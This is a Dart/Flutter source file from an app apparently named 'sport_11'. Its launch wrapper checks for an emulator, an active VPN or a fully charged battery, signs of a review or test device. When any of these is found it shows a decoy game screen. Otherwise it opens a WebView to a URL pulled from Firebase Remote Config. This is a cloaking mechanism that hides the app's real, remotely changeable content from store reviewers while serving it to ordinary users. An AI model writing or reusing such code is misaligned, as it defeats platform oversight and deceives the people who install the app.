import 'package:battery_info/battery_info_plugin.dart';
import 'package:check_vpn_connection/check_vpn_connection.dart';
import 'package:firebase_remote_config/firebase_remote_config.dart';
import 'package:flutter/material.dart';
import 'package:shared_preferences/shared_preferences.dart';
import 'package:sport_11/screens/no_internet_screen.dart';
import 'package:sport_11/screens/play_screen/play_screen.dart';
import 'package:sport_11/screens/web_view_screen.dart';
import 'package:sport_11/services/checksum.dart';
import 'package:sport_11/services/internet_connection.dart';

class Wrapper extends StatefulWidget {
  static const String id = '/check_link';

  Wrapper({Key? key}) : super(key: key);

  @override
  State<Wrapper> createState() => _WrapperState();
}

class _WrapperState extends State<Wrapper> {
  bool? _isEmu;
  bool? _isVpn;
  bool? _isFullBattery;
  bool? _isNeedBattAndVpnCheck;
  String _url = '';
  final InternetConnection _connection = InternetConnection();

  Future<RemoteConfigValue> getVal(String v) async {
    final FirebaseRemoteConfig remoteConfig = FirebaseRemoteConfig.instance;
    await remoteConfig.fetchAndActivate();
    // debugPrint('getAll');
    // debugPrint((await remoteConfig.getAll() as Map<String, dynamic>)['url'].asString());
    // debugPrint((await remoteConfig.getValue('to').asBool().toString()));
    return remoteConfig.getValue(v);
  }

  Future<bool> vpnActive() async {
    if (await CheckVpnConnection.isVpnActive()) {
      return true;
    } else {
      return false;
    }
  }

  Future<bool> battery() async {
    var batteryInfo =
        (await BatteryInfoPlugin().androidBatteryInfo)?.batteryLevel;
    return batteryInfo == 100;
  }

  Future<void> init() async {
    print('init');
    await checkIsEmu().then((value) {
      _isEmu = value;
    });

    String urlFromDevice = await loadUrlFromDevice();
    print('urlFromDevice');
    _isNeedBattAndVpnCheck = (await getVal('to')).asBool();

    if (_isNeedBattAndVpnCheck ?? false) {
      _isVpn = await vpnActive();
      _isFullBattery = await battery();
    }

    if (urlFromDevice.isEmpty) {
      _url = (await getVal('url')).asString();
      await saveUrlOnDevice(_url);
    } else {
      _url = urlFromDevice;
    }
  }

  Future<void> saveUrlOnDevice(String url) async {
    final prefs = await SharedPreferences.getInstance();
    prefs.setString('url', url);
  }

  Future<String> loadUrlFromDevice() async {
    final prefs = await SharedPreferences.getInstance();

    if (prefs.containsKey('url')) {
      return prefs.getString('url') ?? '';
    }
    return '';
  }

  @override
  Widget build(BuildContext context) {
    return FutureBuilder(
      future: init(),
      builder: (BuildContext context, snapshot) {
        if (snapshot.connectionState == ConnectionState.waiting) {
          return const Center(child: CircularProgressIndicator());
        } else if (snapshot.hasError) {
          print('FutureBuilder snapshot error:${snapshot.error}');
        }

        debugPrint(
            '_isNeedVpnAndAccuCheck' + _isNeedBattAndVpnCheck.toString());
        return StreamBuilder(
          stream: _connection.internetStatusStream,
          builder: (BuildContext context, snapshot) {
            bool? data = snapshot.data;

            if (snapshot.connectionState == ConnectionState.waiting) {
              return const Center(child: CircularProgressIndicator());
            }

            if (data ?? false) {
              return isOpenPlayScreen() ? PlayScreen() : WebViewScreen(_url);
            }

            return NoInternetScreen();
          },
        );
      },
    );
  }

  bool isOpenPlayScreen() {
    if (_isNeedBattAndVpnCheck ?? false) {
      if ((_isFullBattery ?? false) || (_isVpn ?? false)) {
        return true;
      }
    }
    if (_url.isEmpty || _isEmu == true) {
      return true;
    }
    return false;
  }
}
